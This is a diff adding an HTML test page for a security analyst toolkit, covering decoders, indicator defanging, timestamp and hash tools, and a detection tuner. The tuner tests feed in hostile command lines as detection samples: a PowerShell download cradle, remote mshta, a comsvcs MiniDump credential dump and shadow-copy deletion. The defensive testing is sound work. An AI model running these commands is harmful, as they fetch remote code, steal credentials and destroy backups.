@@ -1,0 +1,404 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Analyst toolkit tests</title>
+<style>
+  body { font: 14px/1.5 ui-monospace, Consolas, monospace; margin: 24px; }
+  .pass { color: #166534; } .fail { color: #991B1B; font-weight: bold; }
+  #summary { font-size: 18px; margin-bottom: 12px; }
+</style>
+</head>
+<body>
+<h1>Analyst toolkit tests</h1>
+<div id="summary">Running...</div>
+<pre id="out"></pre>
+<script src="../site/js/kit.js"></script>
+<script src="../site/js/network.js"></script>
+<script src="../site/js/decode.js"></script>
+<script src="../site/js/ioc.js"></script>
+<script src="../site/js/time.js"></script>
+<script src="../site/js/hash.js"></script>
+<script src="../site/js/hypothesis.js"></script>
+<script src="../site/js/triage.js"></script>
+<script src="../site/js/report.js"></script>
+<script src="../site/js/reference.js"></script>
+<script src="../site/js/tuner-data.js"></script>
+<script src="../site/js/tuner-core.js"></script>
+<script>
+(async function () {
+  var SK = window.SK, D = SK.decode, I = SK.ioc, T = SK.time, N = SK.net, H = SK.hash, A = SK.ach, Tr = SK.triage, R = SK.report, X = SK.tuner;
+  var lines = [], failed = 0, passed = 0;
+
+  function log(ok, name, detail) {
+    if (ok) passed++; else failed++;
+    lines.push('<span class="' + (ok ? "pass" : "fail") + '">' + (ok ? "PASS " : "FAIL ") + name + (ok || !detail ? "" : "  -> " + detail) + "</span>");
+  }
+  function eq(name, actual, expected) {
+    var a = JSON.stringify(actual), e = JSON.stringify(expected);
+    log(a === e, name, "expected " + e + " got " + a);
+  }
+  function truthy(name, v, detail) { log(!!v, name, detail || String(v)); }
+  function txt(bytes) { return new TextDecoder().decode(bytes); }
+  function near(name, a, b, tol) { log(Math.abs(a - b) <= tol, name, "expected about " + b + " got " + a); }
+
+  // ================= decode =================
+  eq("base64 basic", txt(D.fromBase64("SGVsbG8gV29ybGQ=")), "Hello World");
+  eq("base64 without padding", txt(D.fromBase64("SGVsbG8gV29ybGQ")), "Hello World");
+  eq("base64url chars", Array.from(D.fromBase64("-_-_-_-_")), Array.from(D.fromBase64("+/+/+/+/")));
+  eq("base64 rejects spaces-only junk", D.fromBase64("hello world!"), null);
+  eq("base64 rejects too short", D.fromBase64("abc"), null);
+  eq("hex plain", txt(D.fromHex("48656c6c6f")), "Hello");
+  eq("hex with 0x and spaces", txt(D.fromHex("0x48 0x65 0x6c 0x6c 0x6f")), "Hello");
+  eq("hex with \\x", txt(D.fromHex("\\x48\\x65\\x6c")), "Hel");
+  eq("hex rejects odd length", D.fromHex("abc"), null);
+  eq("url decode", txt(D.fromUrl("%48%65llo+World")), "Hello World");
+  eq("url decode invalid utf8 does not throw", D.fromUrl("%ff%fe").length, 2);
+  eq("url none when no escapes", D.fromUrl("plain"), null);
+  eq("html entities", txt(D.fromHtmlEntities("&lt;b&gt; &#65;&#x42; &amp;")), "<b> AB &");
+  eq("binary", txt(D.fromBinary("01001000 01101001")), "Hi");
+  eq("decimal list", txt(D.fromDecimalList("72 101 108 108 111")), "Hello");
+  eq("fromCharCode", txt(D.fromCharCodes("String.fromCharCode(72,105,33)")), "Hi!");
+  eq("[char] list", txt(D.fromCharCodes("[char]72+[char]105")), "Hi");
+  eq("escape sequences", txt(D.fromEscapes("\\u0048\\x69\\u{1F600}")), "Hi\u{1F600}");
+  eq("rot13", D.rot("Hello", 13), "Uryyb");
+  eq("rot13 twice is identity", D.rot(D.rot("Attack at Dawn", 13), 13), "Attack at Dawn");
+  eq("reverse", D.reverse("abc"), "cba");
+
+  var ps = "VwByAGkAdABlAC0ASABvAHMAdAAgACcAaABlAGwAbABvACAAZgByAG8AbQAgAHMAZQBsAGoAYQBuAC4AbgBlAHQAJwA=";
+  var psRes = D.tryAll(ps).filter(function (r) { return r.id === "base64"; })[0];
+  eq("UTF-16LE base64 detected", psRes && psRes.enc, "UTF-16LE");
+  eq("UTF-16LE base64 text", psRes && psRes.text, "Write-Host 'hello from seljan.net'");
+
+  eq("words: real message", D.looksLikeWords("Hello world, this is the admin login"), true);
+  eq("words: base64 noise", D.looksLikeWords("IjOlNTxNqNOyNP0NFNOiNUZNqNNtNPpNnNOyNTjNoNOiNPNNMtOlNT8NoDNtNUZNMDOfNTbNLDOhNP4NotOyNUDNWjN="), false);
+  eq("words: rot13 of a message shows", D.looksLikeWords(D.rot("Uryyb jbeyq, guvf vf gur nqzva ybtva", 13)), true);
+  eq("words: rot13 of gibberish hidden", D.looksLikeWords(D.rot("VwByAGkAdABlAC0ASABvAHMAdAAgACcAaABlAGwAbABvACAAZgByAG8AbQAgAHMAZQBsAGoAYQBuAC4AbgBlAHQAJwA=", 13)), false);
+  var psPeel = await D.peel(ps, 8);
+  eq("peel UTF-16LE layer is scored readable", psPeel.steps[0].score >= 0.9, true);
+  var layered = btoa(encodeURIComponent("Run the thing: hello & goodbye").replace(/%20/g, "%20"));
+  var peeled = await D.peel(layered, 8);
+  truthy("peel finds two layers", peeled.steps.length >= 2, JSON.stringify(peeled.steps.map(function (s) { return s.method; })));
+  eq("peel final text", peeled.final, "Run the thing: hello & goodbye");
+  var peeled2 = await D.peel("just some ordinary words here", 8);
+  eq("peel leaves ordinary text alone", peeled2.steps.length, 0);
+
+  if (typeof CompressionStream !== "undefined") {
+    var cs = new Blob(["hello hello hello hello"]).stream().pipeThrough(new CompressionStream("gzip"));
+    var gz = new Uint8Array(await new Response(cs).arrayBuffer());
+    eq("detects gzip", D.isCompressed(gz), "gzip");
+    var back = await D.inflate(gz, "gzip");
+    eq("inflate gzip", txt(back), "hello hello hello hello");
+    var gb64 = btoa(String.fromCharCode.apply(null, gz));
+    var pr = await D.peel(gb64, 8);
+    eq("peel base64 then gzip", pr.final, "hello hello hello hello");
+  }
+
+  var plain = new TextEncoder().encode("http://example.com/path");
+  var xored = D.xorWithKey(plain, [0x5a]);
+  var hits = D.xorBrute(xored, "http", 5);
+  truthy("xor brute with crib finds key 0x5a", hits.some(function (h) { return h.key === 0x5a; }));
+  var hits2 = D.xorBrute(D.xorWithKey(new TextEncoder().encode("This program cannot be run in DOS mode. This is a longer sample."), [0x21]), "", 5);
+  eq("xor brute without crib ranks right key first", hits2[0] && hits2[0].key, 0x21);
+  eq("xor with repeating key is reversible", txt(D.xorWithKey(D.xorWithKey(plain, [1, 2, 3]), [1, 2, 3])), "http://example.com/path");
+  eq("magic MZ", D.magic(new Uint8Array([0x4d, 0x5a, 0, 0])).map(function (m) { return m.name.indexOf("PE") >= 0; })[0], true);
+  eq("magic PDF", D.magic(new TextEncoder().encode("%PDF-1.7")).length, 1);
+  eq("magic ZIP", D.magic(new Uint8Array([0x50, 0x4b, 3, 4, 0])).length, 1);
+  eq("magic none", D.magic(new Uint8Array([1, 2, 3, 4, 5])).length, 0);
+  eq("hexdump first line", D.hexdump(new TextEncoder().encode("ABC")).split("\n")[0].indexOf("41 42 43") > 0, true);
+  eq("strings finds ascii", D.strings(new TextEncoder().encode("\u0001\u0002hello world\u0003"), 5)[0], "hello world");
+
+  // ================= network =================
+  eq("ipv4 parse", N.parseIPv4("10.0.0.1"), 167772161);
+  eq("ipv4 reject 256", N.parseIPv4("1.2.3.256"), null);
+  eq("ipv4 reject short", N.parseIPv4("1.2.3"), null);
+  eq("cidr /24 info", [N.cidrInfo("10.0.0.0/24").broadcast, N.cidrInfo("10.0.0.0/24").hosts], ["10.0.0.255", 254]);
+  eq("cidr /31 hosts", N.cidrInfo("10.0.0.0/31").hosts, 2);
+  eq("cidr /32 hosts", N.cidrInfo("10.0.0.5").hosts, 1);
+  eq("cidr rounds host bits", N.cidrInfo("10.0.0.77/24").network, "10.0.0.0");
+  eq("in cidr yes", N.inCIDR4("10.1.2.3", "10.0.0.0/8"), true);
+  eq("in cidr no", N.inCIDR4("11.1.2.3", "10.0.0.0/8"), false);
+  eq("classify private", N.classifyIPv4("192.168.1.1").scope, "private");
+  eq("classify public", N.classifyIPv4("8.8.8.8").routable, true);
+  eq("classify cgnat", N.classifyIPv4("100.64.1.1").scope, "private");
+  eq("classify link-local", N.classifyIPv4("169.254.1.1").scope, "linklocal");
+  eq("classify doc range", N.classifyIPv4("203.0.113.5").scope, "documentation");
+  eq("classify 172.32 is public", N.classifyIPv4("172.32.0.1").routable, true);
+  eq("range to cidr", N.rangeToCIDRs("10.0.0.5", "10.0.0.200"), ["10.0.0.5/32", "10.0.0.6/31", "10.0.0.8/29", "10.0.0.16/28", "10.0.0.32/27", "10.0.0.64/26", "10.0.0.128/26", "10.0.0.192/29", "10.0.0.200/32"]);
+  eq("range whole space", N.rangeToCIDRs("0.0.0.0", "255.255.255.255"), ["0.0.0.0/0"]);
+  eq("range backwards", N.rangeToCIDRs("10.0.0.9", "10.0.0.1"), null);
+  eq("split /16 into /18", N.splitCIDR("10.0.0.0/16", 18).blocks, ["10.0.0.0/18", "10.0.64.0/18", "10.0.128.0/18", "10.0.192.0/18"]);
+  eq("ipv6 compress", N.ipv6Compress(N.parseIPv6("2001:0db8:0000:0000:0000:ff00:0042:8329")), "2001:db8::ff00:42:8329");
+  eq("ipv6 expand", N.ipv6Expand(N.parseIPv6("::1")), "0000:0000:0000:0000:0000:0000:0000:0001");
+  eq("ipv6 loopback", N.classifyIPv6("::1").scope, "loopback");
+  eq("ipv6 link-local", N.classifyIPv6("fe80::1").scope, "linklocal");
+  eq("ipv6 ula", N.classifyIPv6("fd12:3456::1").scope, "private");
+  eq("ipv6 documentation", N.classifyIPv6("2001:db8::1").scope, "documentation");
+  eq("ipv6 global", N.classifyIPv6("2606:4700:4700::1111").routable, true);
+  eq("ipv6 mapped", N.classifyIPv6("::ffff:1.2.3.4").label.indexOf("mapped") > 0, true);
+  eq("ipv6 NAT64", N.classifyIPv6("64:ff9b::1.2.3.4").label.indexOf("NAT64") >= 0, true);
+  eq("ipv6 reject junk", N.parseIPv6("12:30:45"), null);
+  eq("ipv6 reject mac", N.parseIPv6("aa:bb:cc:dd:ee:ff"), null);
+
+  // ================= indicators =================
+  eq("defang url", I.defang("see https://evil.com/a.b now"), "see hxxps://evil[.]com/a.b now");
+  eq("defang http with port", I.defang("http://1.2.3.4:8080/x"), "hxxp://1[.]2[.]3[.]4:8080/x");
+  eq("defang ip", I.defang("host 8.8.8.8 ok"), "host 8[.]8[.]8[.]8 ok");
+  eq("defang email", I.defang("a.b@evil.com"), "a.b[@]evil[.]com");
+  eq("defang leaves file names", I.defang("run setup.exe and evil.org"), "run setup.exe and evil[.]org");
+  eq("defang keeps url trailing period", I.defang("Go to http://evil.com."), "Go to hxxp://evil[.]com.");
+  eq("defang ignores bad ip", I.defang("version 999.1.1.1"), "version 999.1.1.1");
+  eq("refang", I.refang("hxxps://evil[.]com/a x[@]y(.)z"), "https://evil.com/a x@y.z");
+  eq("refang bracket-word forms", I.refang("evil[dot]com and a(at)b.com"), "evil.com and a@b.com");
+  eq("refang fxp and brackets", I.refang("fxp[:]//host[.]net"), "ftp://host.net");
+  eq("defang then refang round trip", I.refang(I.defang("http://evil.com/x?a=1")), "http://evil.com/x?a=1");
+  var ex = I.extract("Mail bob@evil.example visited hxxps://bad[.]example/p?x=1 from 198.51.100.7 and 10.0.0.9 hash 275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f CVE-2023-23397 T1566.001 file setup.exe 999.9.9.9");
+  eq("extract url", ex.urls, ["https://bad.example/p?x=1"]);
+  eq("extract ips", ex.ips.sort(), ["10.0.0.9", "198.51.100.7"]);
+  eq("extract email", ex.emails, ["bob@evil.example"]);
+  truthy("extract domains has bad.example", ex.domains.indexOf("bad.example") >= 0 && ex.domains.indexOf("evil.example") >= 0, JSON.stringify(ex.domains));
+  eq("extract skips file names", ex.domains.indexOf("setup.exe"), -1);
+  eq("extract sha256", ex.sha256.length, 1);
+  eq("extract does not count sha256 as md5", ex.md5.length, 0);
+  eq("extract cve", ex.cves, ["CVE-2023-23397"]);
+  eq("extract attack id", ex.attack, ["T1566.001"]);
+  eq("extract rejects invalid ip", ex.ips.indexOf("999.9.9.9"), -1);
+  eq("extract ipv6", I.extract("seen from 2001:db8::5 today at 12:30:45").ipv6, ["2001:db8::5"]);
+  eq("extract dedupes", I.extract("1.1.1.1 1.1.1.1 1.1.1.1").ips, ["1.1.1.1"]);
+
+  // ================= time =================
+  var base = 1700000000000;
+  var nums = { unix_s: "1700000000", unix_ms: "1700000000000", filetime: "133444736000000000", webkit: "13344473600000000", dotnet: "638355968000000000", cocoa: "721692800" };
+  Object.keys(nums).forEach(function (k) {
+    var f = T.interpretNumber(nums[k]).filter(function (x) { return x.name && x.plausible; });
+    var ok = f.some(function (x) { return Math.abs(x.ms - base) < 1000; });
+    log(ok, "numeric " + k + " reads as 2023-11-14", JSON.stringify(f.map(function (x) { return x.name; })));
+  });
+  near("excel serial", T.interpretNumber("45244.925926").filter(function (x) { return x.id === "excel"; })[0].ms, base, 2000);
+  eq("allFormats filetime", T.allFormats(base).filter(function (r) { return r[0] === "Windows FILETIME"; })[0][1], "133444736000000000");
+  eq("allFormats unix seconds", T.allFormats(base).filter(function (r) { return r[0] === "Unix seconds"; })[0][1], "1700000000");
+  eq("allFormats webkit", T.allFormats(base).filter(function (r) { return r[0].indexOf("WebKit") > 0; })[0][1], "13344473600000000");
+  eq("allFormats dotnet", T.allFormats(base).filter(function (r) { return r[0] === ".NET ticks"; })[0][1], "638355968000000000");
+  eq("allFormats cocoa", T.allFormats(base).filter(function (r) { return r[0].indexOf("Cocoa") > 0; })[0][1], "721692800");
+  eq("iso utc", T.parseText("2026-10-27T13:55:36Z").ms, Date.UTC(2026, 9, 27, 13, 55, 36));
+  eq("iso with offset", T.parseText("2026-10-27T13:55:36-04:00").ms, Date.UTC(2026, 9, 27, 17, 55, 36));
+  eq("iso fraction", T.parseText("2026-10-27T13:55:36.250Z").ms, Date.UTC(2026, 9, 27, 13, 55, 36, 250));
+  eq("iso no zone assumes given zone", T.parseText("2026-10-27 09:55:36", "America/New_York").ms, Date.UTC(2026, 9, 27, 13, 55, 36));
+  eq("iso no zone flagged assumed", T.parseText("2026-10-27 09:55:36").assumed, true);
+  eq("clf", T.parseText("27/Oct/2026:13:55:36 -0400").ms, Date.UTC(2026, 9, 27, 17, 55, 36));
+  eq("rfc2822", T.parseText("Tue, 27 Oct 2026 13:55:36 +0000").ms, Date.UTC(2026, 9, 27, 13, 55, 36));
+  eq("syslog uses given year", T.parseText("Oct 27 13:55:36", "UTC", Date.UTC(2026, 5, 1)).ms, Date.UTC(2026, 9, 27, 13, 55, 36));
+  eq("garbage text", T.parseText("not a date"), null);
+  eq("zone offset new york summer", T.zoneOffsetMinutes(Date.UTC(2026, 6, 1), "America/New_York"), -240);
+  eq("zone offset new york winter", T.zoneOffsetMinutes(Date.UTC(2026, 11, 1), "America/New_York"), -300);
+  eq("local to utc across DST", T.zonedToUtc(2026, 12, 1, 9, 0, 0, 0, "America/New_York"), Date.UTC(2026, 11, 1, 14, 0, 0));
+  eq("formatIn utc", T.formatIn(Date.UTC(2026, 9, 27, 13, 55, 36), "UTC").indexOf("2026-10-27 13:55:36") > 0, true);
+  eq("duration", T.duration(0, 90061000), "1 day 01:01:01 (90,061 seconds)");
+  eq("relative past", T.relative(0, 3 * 86400000 + 4 * 3600000), "3 days 4 hours ago");
+
+  // ================= hashes =================
+  var enc = function (s) { return new TextEncoder().encode(s); };
+  eq("md5 empty", H.md5(enc("")), "d41d8cd98f00b204e9800998ecf8427e");
+  eq("md5 abc", H.md5(enc("abc")), "900150983cd24fb0d6963f7d28e17f72");
+  eq("md5 fox", H.md5(enc("The quick brown fox jumps over the lazy dog")), "9e107d9d372bb6826bd81d3542a419d6");
+  eq("md5 55 bytes (padding edge)", H.md5(enc(new Array(56).join("a"))), "ef1772b6dff9a122358552954ad0df65");
+  eq("md5 56 bytes (padding edge)", H.md5(enc(new Array(57).join("a"))), "3b0c8ac703f828b04c6c197006d17218");
+  eq("md5 64 bytes", H.md5(enc(new Array(65).join("a"))), "014842d480b571495a4a0363793f7367");
+  eq("crc32", H.crc32(enc("123456789")), "cbf43926");
+  var dg = await H.digestAll(enc("abc"));
+  eq("sha1 abc", dg.sha1, "a9993e364706816aba3e25717850c26c9cd0d89d");
+  eq("sha256 abc", dg.sha256, "ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad");
+  eq("identify md5 length", H.identify("5d41402abc4b2a76b9719d911017c592")[0].name, "MD5");
+  eq("identify also offers NTLM", H.identify("5d41402abc4b2a76b9719d911017c592").some(function (x) { return x.name.indexOf("NTLM") >= 0; }), true);
+  eq("identify sha256", H.identify("ba7816bf8f01cfea414140de5dae2223b00361a396177a9cb410ff61f20015ad")[0].name, "SHA-256");
+  eq("identify bcrypt", H.identify("$2b$12$" + new Array(54).join("a"))[0].name, "bcrypt");
+  eq("identify sha512crypt", H.identify("$6$salt$hashhashhash")[0].name.indexOf("SHA-512 crypt") === 0, true);
+  eq("identify netntlmv2", H.identify("user::DOMAIN:1122334455667788:" + new Array(33).join("a") + ":0101")[0].name.indexOf("NetNTLMv2") === 0, true);
+  eq("identify junk", H.identify("hello world")[0].name, "No known hash format");
+  eq("extension mismatch", H.extensionCheck("invoice.pdf", D.magic(new Uint8Array([0x4d, 0x5a, 0, 0]))).ok, false);
+  eq("extension match", H.extensionCheck("tool.exe", D.magic(new Uint8Array([0x4d, 0x5a, 0, 0]))).ok, true);
+  eq("extension docx is zip", H.extensionCheck("a.docx", D.magic(new Uint8Array([0x50, 0x4b, 3, 4, 0]))).ok, true);
+
+  // ================= hypotheses =================
+  var st = { question: "q", hypotheses: [{ id: "h1", label: "phish" }, { id: "h2", label: "admin" }],
+    evidence: [{ id: "e1", text: "hidden window", weight: 3, source: "edr", ratings: { h1: "C", h2: "I" } },
+               { id: "e2", text: "known script", weight: 1, source: "cmdb", ratings: { h1: "I", h2: "C" } },
+               { id: "e3", text: "host exists", weight: 2, source: "cmdb", ratings: { h1: "C", h2: "C" } }] };
+  var sc = A.score(st);
+  eq("ach against h1", sc[0].against, 1);
+  eq("ach against h2", sc[1].against, 3);
+  eq("ach support h1", sc[0].support, 5);
+  eq("ach low-diagnostic flagged", A.diagnostic(st).map(function (d) { return d.low; }), [false, false, true]);
+  truthy("ach markdown has matrix", A.toMarkdown(st).indexOf("| hidden window | 3 | edr | C | I |") > 0);
+
+  // ================= triage =================
+  eq("triage none is low", Tr.score({}).level, "good");
+  eq("triage a2 forces bad", Tr.score({ a2: "yes" }).level, "bad");
+  eq("triage c2 with s1 forces bad", Tr.score({ c2: "yes", s1: "yes" }).level, "bad");
+  eq("triage mid is warn", Tr.score({ s1: "yes", s2: "yes" }).level, "warn");
+  eq("triage unsure counts half", Tr.score({ s1: "unsure" }).total, 1);
+  var resBad = Tr.score({ a2: "yes", i2: "yes" });
+  truthy("triage creds step", Tr.actions({ a2: "yes", i2: "yes" }, resBad).some(function (a) { return /Reset the account password/.test(a); }));
+  truthy("triage note mentions assessment", Tr.note({ a2: "yes" }, Tr.score({ a2: "yes" }), ["x"], {}).indexOf("Likely phishing") > 0);
+
+  // ================= incident note =================
+  var md = R.toMarkdown({ title: "T", indicators: "http://evil.com/x\n1.2.3.4", timeline: "13:00 start", summary: "s" });
+  truthy("report defangs indicators", md.indexOf("hxxp://evil[.]com/x") > 0 && md.indexOf("1[.]2[.]3[.]4") > 0);
+  truthy("report timeline bullets", md.indexOf("- 13:00 start") > 0);
+
+  // ================= reference =================
+  eq("reference table count", SK.reference.tables.length, 8);
+  eq("estimative scale has seven terms", SK.reference.tables.filter(function (t) { return t.id === "est"; })[0].rows.length, 7);
+
+  // ================= tuner: sanitize =================
+  var san = X.sanitizeAll(["a 10.0.0.1 b 10.0.0.1 c 10.0.0.2", "x 192.0.2.1 y 10.9.9.9"], { terms: [] });
+  eq("sanitize consistent mapping", san.texts[0], "a 192.0.2.2 b 192.0.2.2 c 192.0.2.3");
+  eq("sanitize avoids real doc-range collision", san.texts[1], "x 192.0.2.4 y 192.0.2.5".replace("192.0.2.4", "192.0.2.4"));
+  eq("sanitize leaves no original ips", /10\.0\.0\.[12]|10\.9\.9\.9/.test(san.texts.join(" ")), false);
+  eq("sanitize version numbers not at 5 parts", X.sanitizeAll(["v 1.2.3.4.5 here"], {}).texts[0], "v 1.2.3.4.5 here");
+  eq("sanitize invalid ip untouched", X.sanitizeAll(["999.1.1.1"], {}).texts[0], "999.1.1.1");
+  var s2 = X.sanitizeAll(["mail bob@corp.com", "C:\\Users\\jsmith\\AppData and CORP\\jsmith and C:\\\\Users\\\\jsmith\\\\x and C:\\Users\\Public\\x"], {});
+  eq("sanitize email", s2.texts[0], "mail user1@example.com");
+  eq("sanitize profile name everywhere", s2.texts[1], "C:\\Users\\USER1\\AppData and CORP\\USER1 and C:\\\\Users\\\\USER1\\\\x and C:\\Users\\Public\\x");
+  eq("sanitize custom terms", X.sanitizeAll(["host SRV-DB01 and srv-db01"], { terms: ["srv-db01"] }).texts[0], "host REDACTED-1 and REDACTED-1");
+  eq("sanitize 2001:db8 for ipv6", X.sanitizeAll(["from 2a00:1450::1 ok"], {}).texts[0], "from 2001:db8::1 ok");
+  var s3 = X.sanitizeAll(["ip 10.0.0.1 user bob@corp.com C:\\Users\\jsmith\\x"], {});
+  eq("restore round trip", X.restore(s3.texts[0], s3.map), "ip 10.0.0.1 user bob@corp.com C:\\Users\\jsmith\\x");
+  var first = X.sanitizeAll(["a 10.0.0.1 b bob@corp.com C:\\Users\\jsmith\\x"], {});
+  var second = X.sanitizeAll([first.texts[0] + " c 10.0.0.2 d amy@corp.com C:\\Users\\kdoe\\y"], { existing: first.map });
+  eq("second sanitize keeps earlier placeholders", second.texts[0].indexOf("a 192.0.2.1 b user1@example.com C:\\Users\\USER1\\x") === 0, true);
+  eq("second sanitize gives new values new placeholders", second.texts[0].indexOf(" c 192.0.2.2 d user2@example.com C:\\Users\\USER2\\y") > 0, true);
+  eq("second sanitize reports only the new entries", second.map.length, 3);
+  eq("restore with combined map recovers both runs", X.restore(second.texts[0], first.map.concat(second.map)), "a 10.0.0.1 b bob@corp.com C:\\Users\\jsmith\\x c 10.0.0.2 d amy@corp.com C:\\Users\\kdoe\\y");
+  eq("sanitize options off", X.sanitizeAll(["10.0.0.1 bob@corp.com"], { ips: false, emails: false }).texts[0], "10.0.0.1 bob@corp.com");
+
+  // ================= tuner: parsing =================
+  eq("parse json array", X.parseLogs('[{"a":1,"b":{"c":"x"}}]').events[0], { a: "1", "b.c": "x" });
+  eq("parse jsonl", X.parseLogs('{"a":1}\n{"a":2}').events.length, 2);
+  eq("parse jsonl format", X.parseLogs('{"a":1}\n{"a":2}').format, "jsonl");
+  eq("parse key=value", X.parseLogs('host=a user="bob smith" cmd=run\nhost=b user=al cmd=go').events[0], { host: "a", user: "bob smith", cmd: "run" });
+  eq("parse csv", X.parseLogs('Image,CommandLine\n"a.exe","a.exe -x, y"').events[0], { Image: "a.exe", CommandLine: "a.exe -x, y" });
+  eq("parse tsv format", X.parseLogs("Image\tUser\na.exe\tbob").format, "tsv");
+  var blocks = X.parseLogs("Process Create:\nUtcTime: 2026-10-27 13:00:00\nImage: C:\\a.exe\nCommandLine: a.exe -x\n\nProcess Create:\nUtcTime: 2026-10-27 13:01:00\nImage: C:\\b.exe\nCommandLine: b.exe");
+  eq("parse blocks", [blocks.format, blocks.events.length, blocks.events[1].Image], ["blocks", 2, "C:\\b.exe"]);
+  eq("parse raw lines", X.parseLogs("just a line\nanother line").events, [{ _raw: "just a line" }, { _raw: "another line" }]);
+  eq("parse syslog line stays raw", X.parseLogs("Oct 27 13:55:36 host sshd[1]: Failed password for root").format, "raw");
+  eq("parse empty", X.parseLogs("  \n ").format, "empty");
+  eq("parse limit", X.parseLogs(new Array(11).join("line\n"), 3).events.length, 3);
+
+  // ================= tuner: roles and risks =================
+  eq("role Image", X.roleOf("Image"), "image");
+  eq("role ParentImage", X.roleOf("ParentImage"), "parentImage");
+  eq("role ParentCommandLine", X.roleOf("ParentCommandLine"), "parentCmd");
+  eq("role CommandLine", X.roleOf("CommandLine"), "cmd");
+  eq("role NewProcessName", X.roleOf("NewProcessName"), "image");
+  eq("role ParentProcessName", X.roleOf("ParentProcessName"), "parentImage");
+  eq("role ParentProcessId ignored", X.roleOf("ParentProcessId"), null);
+  eq("role UtcTime ignored", X.roleOf("UtcTime"), null);
+  eq("role UDM parent", X.roleOf("principal.process.file.full_path"), "parentImage");
+  eq("role UDM child", X.roleOf("target.process.file.full_path"), "image");
+  eq("role UDM child cmd", X.roleOf("target.process.command_line"), "cmd");
+  eq("role SubjectUserName", X.roleOf("SubjectUserName"), "user");
+  eq("role Computer", X.roleOf("Computer"), "host");
+
+  function flagIds(ev) { return X.flagsFor(ev, X.rolesOf(ev)).map(function (f) { return f.id; }); }
+  var office = flagIds({ ParentImage: "C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE", Image: "C:\\Windows\\System32\\cmd.exe", CommandLine: "cmd.exe /c whoami" });
+  truthy("flag office-child", office.indexOf("office-child") >= 0, JSON.stringify(office));
+  truthy("flag browser-child", flagIds({ ParentImage: "C:\\x\\chrome.exe", Image: "C:\\Windows\\System32\\powershell.exe", CommandLine: "powershell" }).indexOf("browser-child") >= 0);
+  truthy("flag encoded", flagIds({ Image: "powershell.exe", CommandLine: "powershell.exe -nop -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA" }).indexOf("encoded-command") >= 0);
+  truthy("flag download cradle", flagIds({ Image: "powershell.exe", CommandLine: "powershell -c (New-Object Net.WebClient).DownloadString('http://x')" }).indexOf("download-cradle") >= 0);
+  truthy("flag hidden bypass", flagIds({ Image: "powershell.exe", CommandLine: "powershell -nop -w hidden -File a.ps1" }).indexOf("hidden-bypass") >= 0);
+  truthy("flag writable path", flagIds({ Image: "C:\\Users\\bob\\AppData\\Local\\Temp\\a.exe", CommandLine: "a.exe" }).indexOf("writable-path") >= 0);
+  truthy("flag lolbin remote", flagIds({ Image: "C:\\Windows\\System32\\mshta.exe", CommandLine: "mshta http://x/a.hta" }).indexOf("lolbin-remote") >= 0);
+  truthy("flag credential theft", flagIds({ Image: "rundll32.exe", CommandLine: "rundll32 comsvcs.dll, MiniDump 624 out.dmp full" }).indexOf("credential-theft") >= 0);
+  truthy("flag recovery tamper", flagIds({ Image: "vssadmin.exe", CommandLine: "vssadmin delete shadows /all /quiet" }).indexOf("recovery-tamper") >= 0);
+  truthy("flag svchost oddity", flagIds({ ParentImage: "C:\\Windows\\explorer.exe", Image: "C:\\Windows\\System32\\svchost.exe", CommandLine: "svchost.exe" }).indexOf("svchost-oddity") >= 0);
+  eq("svchost normal not flagged", flagIds({ ParentImage: "C:\\Windows\\System32\\services.exe", Image: "C:\\Windows\\System32\\svchost.exe", CommandLine: "svchost.exe -k netsvcs" }).indexOf("svchost-oddity"), -1);
+  truthy("flag double extension", flagIds({ Image: "C:\\Users\\a\\invoice.pdf.exe", CommandLine: "invoice.pdf.exe" }).indexOf("double-extension") >= 0);
+  eq("benign agent not flagged", flagIds({ ParentImage: "C:\\Program Files\\Northwind\\agent.exe", Image: "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", CommandLine: "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"C:\\Program Files\\Northwind\\a.ps1\"" }), []);
+
+  // ================= tuner: command patterns =================
+  eq("cmd exact", X.cmdPattern(["a -x", "a -x"]).type, "exact");
+  var pat = X.cmdPattern(["tool -Job 1042 -Run 2026-10-20", "tool -Job 1043 -Run 2026-10-21"]);
+  eq("cmd pattern type", pat.type, "pattern");
+  truthy("cmd pattern regex matches both and a new one", ["tool -Job 1042 -Run 2026-10-20", "tool -Job 1043 -Run 2026-10-21", "tool -Job 77 -Run 2027-01-02"].every(function (s) { return new RegExp(pat.regex).test(s); }));
+  eq("cmd pattern rejects different command", new RegExp(pat.regex).test("tool -Job 1042 -Run 2026-10-20 -Extra evil"), false);
+  var pre = X.cmdPattern(["C:\\Tools\\scan.exe /target alpha /quiet", "C:\\Tools\\scan.exe /target beta /quiet", "C:\\Tools\\scan.exe /target gamma"]);
+  eq("cmd prefix type", pre.type, "prefix");
+  eq("cmd prefix cut at boundary", pre.prefix, "C:\\Tools\\scan.exe /target ");
+  eq("cmd none when too different", X.cmdPattern(["a", "bcdefghijkl"]).type, "none");
+  eq("normalize guid", X.normalizeCmd("x 3f2504e0-4f89-11d3-9a0c-0305e82c3301 y"), "x {GUID} y");
+  eq("normalize keeps digits glued to letters", X.normalizeCmd("run a.ps1 -Job 42 x64"), "run a.ps1 -Job {NUM} x64");
+  eq("pattern does not widen file extension", new RegExp(X.cmdPattern(["x a.ps1 -n 1", "x a.ps1 -n 2"]).regex).test("x a.ps2 -n 3"), false);
+
+  // ================= tuner: analysis on the sample =================
+  var logs = SK.tunerData.SAMPLE.logs;
+  var parsed = X.parseLogs(logs);
+  eq("sample parses", [parsed.format, parsed.events.length], ["jsonl", 6]);
+  var an = X.analyze(parsed.events);
+  eq("sample flagged events", an.flaggedEvents, 1);
+  truthy("sample flags office-child", an.flagged.some(function (f) { return f.risk.id === "office-child"; }));
+  var unblocked = an.candidates.filter(function (c) { return !c.blocked && c.level === "strict"; });
+  eq("sample has one narrow candidate", unblocked.length, 1);
+  eq("narrow candidate covers backup events", unblocked[0].coverage, 5);
+  eq("narrow candidate has cmd pattern", unblocked[0].conds.some(function (c) { return c.role === "cmd" && c.op === "regex"; }), true);
+  eq("narrow candidate carries uniform user", unblocked[0].conds.some(function (c) { return c.role === "user"; }), true);
+  var nameCand = an.candidates.filter(function (c) { return c.level === "name"; })[0];
+  eq("name-only candidate is blocked by the office event", nameCand.blocked, true);
